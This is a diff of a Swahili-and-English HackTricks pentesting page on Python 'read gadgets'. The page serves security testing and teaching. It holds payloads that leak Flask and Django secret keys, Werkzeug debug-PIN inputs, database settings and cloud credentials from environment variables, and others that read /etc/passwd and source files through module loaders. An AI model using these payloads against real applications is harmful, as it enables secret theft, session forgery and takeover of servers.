@@ -1,83 +1,106 @@
-# Vifaa vya Kusoma vya Ndani vya Python
+# Python Internal Read Gadgets
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Taarifa za Msingi
+## Maelezo ya Msingi
 
-Udhaifu mbalimbali kama [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) au [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) zinaweza kukuruhusu **kusoma data za ndani za python lakini hazitaturuhusu kuendesha code**. Kwa hiyo, pentester atahitaji kutumia vizuri vibali hivi vya kusoma ili **kupata vibali nyeti na kuongeza kiwango cha udhaifu**.
+Vulnerabilities tofauti kama vile [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) au [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) zinaweza kukuruhusu **kusoma data ya ndani ya Python lakini hazitakuruhusu kutekeleza code**. Kwa hivyo, pentester atahitaji kutumia kikamilifu ruhusa hizi za kusoma ili **kupata privileges nyeti na kuongeza ukali wa vulnerability**.
 
-### Flask - Soma ufunguo wa siri
+### Flask - Soma secret key
 
-Ukurasa mkuu wa programu ya Flask huenda ukawa na global object **`app`** ambako **ufunguo wa siri umewekwa**.
+Ukurasa mkuu wa application ya Flask huenda ukawa na global object ya **`app`** ambapo **secret hii imewekwa**.
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-Katika kesi hii inawezekana kufikia kitu hiki kwa kutumia gadget yoyote tu ili **access global objects** kutoka kwenye [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).
+Katika hali hii inawezekana kufikia object hii kwa kutumia gadget yoyote ya **access global objects** kutoka kwenye ukurasa wa [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).
 
-Katika kesi ambapo **udhaifu uko katika faili tofauti ya python**, unahitaji gadget kuvuka faili ili kufikia faili kuu ili **access the global object `app.secret_key`** kubadilisha Flask secret key na kuwa na uwezo wa [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Katika hali ambapo **vulnerability iko kwenye python file tofauti**, unahitaji gadget ya kupitia files ili kufikia file kuu na **access global object `app.secret_key`**, kisha uweze [**escalate privileges** ukijua key hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Payload kama hii [from this writeup](https://ctftime.org/writeup/36082):
+Payload kama huu [kutoka kwenye writeup hii](https://ctftime.org/writeup/36082):
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Tumia payload hii ili **kubadilisha `app.secret_key`** (jina katika app yako linaweza kuwa tofauti) ili uweze kusaini flask cookies mpya zenye ruhusa zaidi.
+Tumia **payload hii kusoma `app.secret_key`**. Ikiwa bug ya awali pia inakupa write primitive (kwa mfano, class pollution), njia hiyo hiyo inaweza kutumika kuibadilisha na kusaini Flask cookies zenye privileges zaidi.
 
 ### Werkzeug - machine_id na node uuid
 
-[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) utaweza kupata **machine_id** na nodi ya **uuid**, ambazo ni **siri kuu** unazohitaji ili [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) unaweza kutumia kufikia python console katika `/console` ikiwa **debug mode** imewezeshwa:
+[**Kwa kutumia payload hizi kutoka kwenye writeup hii**](https://vozec.fr/writeups/tweedle-dum-dee/) utaweza kufikia **machine_id** na node **uuid**, ambazo ni **vipande vya siri** unavyohitaji [**kutengeneza Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) na kufikia python console kwenye `/console` ikiwa **debug mode imewezeshwa**:
 ```python
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
 ```
 > [!WARNING]
-> Kumbuka kuwa unaweza kupata **njia ya ndani ya server kwa `app.py`** kwa kusababisha baadhi ya **makosa** kwenye ukurasa wa wavuti ambayo itakupa njia.
+> Kumbuka kwamba unaweza kupata **servers local path to the `app.py`** kwa kuzalisha **error** fulani kwenye ukurasa wa webu ambayo **itakupa path**.
 
-If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.
+Ikiwa vulnerability iko kwenye python file tofauti, angalia Flask trick iliyotangulia ili kufikia objects kutoka kwenye python file kuu.
 
 ### Django - SECRET_KEY and settings module
 
-Object ya settings ya Django imehifadhiwa kwenye `sys.modules` mara tu application inapozinduliwa. Kwa primitives za kusoma pekee unaweza leak **`SECRET_KEY`**, database credentials au signing salts:
+Django settings object huwekwa kwenye cache ya `sys.modules` mara tu application inapoanza. Kwa kutumia read primitives pekee, unaweza kuvuja **`SECRET_KEY`**, fallback keys, database credentials au signing salts:
 ```python
 # When DJANGO_SETTINGS_MODULE is set (usual case)
 sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY
 
 # Through the global settings proxy
 a = sys.modules['django.conf'].settings
-(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
+(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
+a.SESSION_ENGINE, a.SESSION_SERIALIZER)
 ```
-Ikiwa vulnerable gadget iko katika module nyingine, walk globals kwanza:
+Ikiwa gadget yenye udhaifu iko katika module nyingine, pitia globals kwanza:
 ```python
 __init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
 ```
-Mara tu key itakapojulikana unaweza kutengeneza Django signed cookies au tokens kwa njia inayofanana na Flask.
+`SECRET_KEY_FALLBACKS` zina thamani sawa na `SECRET_KEY` ya sasa: bado zinathibitisha values za zamani zilizotiwa saini wakati wa rotation. Pia leak `SESSION_ENGINE` na `SESSION_SERIALIZER` ili kubaini haraka kama impact inaishia kwenye cookie forgery au ni kubwa zaidi. Kwa maelezo ya web impact, angalia [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).
 
-### Environment variables / cloud creds kupitia modules zilizopakuliwa
+### Module loader gadgets - kusoma source code na files
 
-Jails nyingi bado huimport `os` au `sys` mahali fulani. Unaweza kutumia vibaya function yoyote inayoweza kufikiwa `__init__.__globals__` ili kupiga pivot hadi module ya `os` ambayo tayari imeimportiwa na ku-dump **environment variables** zenye API tokens, cloud keys au flags:
+Python modules zilizopakiwa kwa kawaida huhifadhi `__loader__`. File-backed loaders mara nyingi hufichua `get_source()` na `get_data()`, ambazo ni **read-only primitives** bora unapoweza tayari kufikia module object lakini huwezi kutumia `open()`:
+```python
+m = __init__.__globals__['sys'].modules['__main__']
+m.__loader__.get_source(m.__name__)   # source of app.py / __main__
+m.__loader__.get_data(m.__file__)     # raw bytes of the same file
+```
+Hii ni muhimu sana kwa kufanya **dump ya config modules, blueprints, helper files au hidden routes** na kurejesha API keys, DSNs, flag paths au gadget entry points za ziada.
+
+Ikiwa una subclass enumeration pekee, tafuta loader kwa jina badala ya kuweka index kwa hard-code:
+```python
+# unbound call: first argument acts as a dummy self
+[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
+```
+### Generator / coroutine frame globals
+
+Ikiwa unaweza kuunda au kufikia object ya generator/coroutine, frame yake inaweza ku-leak globals **bila kuhitaji gadget yoyote ya function `__globals__`**. Hii ni muhimu dhidi ya filters zinazozuia tu majina ya dunder na kusahau frame attributes kama `gi_frame`, `ag_frame`, `cr_frame` au `f_globals`:
+```python
+(_ for _ in ()).gi_frame.f_globals['__builtins__']
+(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
+```
+Mara tu unapokuwa na frame globals, endelea kama ilivyo kwenye gadgets nyingine (`sys.modules`, settings objects, `os.environ`, n.k.). Sandbox escapes za hivi karibuni zinaendelea kugundua tena mbinu hii kwa sababu `gi_frame` na `f_globals` si dunder attributes na mara nyingi hustahimili deny-lists za kijinga.
+
+### Environment variables / cloud creds kupitia loaded modules
+
+Jails nyingi bado zina-import `os` au `sys` mahali fulani. Unaweza kutumia vibaya function yoyote inayoweza kufikiwa kupitia `__init__.__globals__` ili kuelekea kwenye module ya `os` iliyo-importiwa tayari na kudump **environment variables** zilizo na API tokens, cloud keys au flags:
 ```python
 # Classic os._wrap_close subclass index may change per version
 cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
 cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
 ```
-Ikiwa index ya subclass imechujwa, tumia loaders:
+Ikiwa subclass index imechujwa, tumia loaders:
 ```python
 __loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
 ```
-Environment variables mara nyingi ndio secrets pekee zinazohitajika kusonga kutoka read hadi full compromise (cloud IAM keys, database URLs, signing keys, etc.).
+Environment variables mara nyingi huwa siri pekee zinazohitajika kuhama kutoka read hadi full compromise (cloud IAM keys, database URLs, signing keys, n.k.).
 
 ### Django-Unicorn class pollution (CVE-2025-24370)
 
-`django-unicorn` (<0.62.0) iliruhusu **class pollution** kupitia crafted component requests. Kuweka property path kama `__init__.__globals__` kumruhusu mshambuliaji kufikia component module globals na modules yoyote zilizo imported (e.g. `settings`, `os`, `sys`). Kutoka huko unaweza leak `SECRET_KEY`, `DATABASES` au service credentials bila code execution. The exploit chain ni purely read-based na inatumia same dunder-gadget patterns kama hapo juu.
+`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) iliruhusu **class pollution** kupitia component requests zilizoundwa mahsusi. Kuweka property path kama `__init__.__globals__` kulimwezesha attacker kufikia component module globals na modules zozote zilizo-importiwa (k.m. `settings`, `os`, `sys`). Kutoka hapo unaweza ku-leak `SECRET_KEY`, `DATABASES` au service credentials bila code execution. Exploit chain hii inategemea kusoma pekee na hutumia dunder-gadget patterns zilezile kama hapo juu.
 
 ### Gadget collections for chaining
 
-Recent CTFs (e.g. jailCTF 2025) zinaonyesha reliable read chains zilizojengwa tu kwa attribute access na subclass enumeration. Community-maintained lists such as [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) zinakatalogia mamia ya minimal gadgets unaweza kuziunganisha ili kuvuka kutoka objects hadi `__globals__`, `sys.modules` na hatimaye sensitive data. Zitumie kujirekebisha haraka wakati indices au class names zinatofautiana kati ya Python minor versions.
-
-
+CTF za hivi karibuni na utafiti wa pyjail vinaonyesha read chains zinazotegemeka, zilizojengwa kwa kutumia attribute access na subclass enumeration pekee. Orodha zinazodumishwa na community kama [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) zinaorodhesha mamia ya minimal gadgets unazoweza kuchanganya ili kupita kutoka kwenye objects hadi `__globals__`, `sys.modules` na hatimaye data nyeti. Pendelea searches zinazotegemea **attribute/name** badala ya raw subclass indexes, kwa sababu nafasi ya `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, n.k. hubadilika kati ya Python versions na pamoja na libraries za ziada zilizo-importiwa.
 
 ## References
 
-- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
+- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
 - [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
 {{#include ../../banners/hacktricks-training.md}}
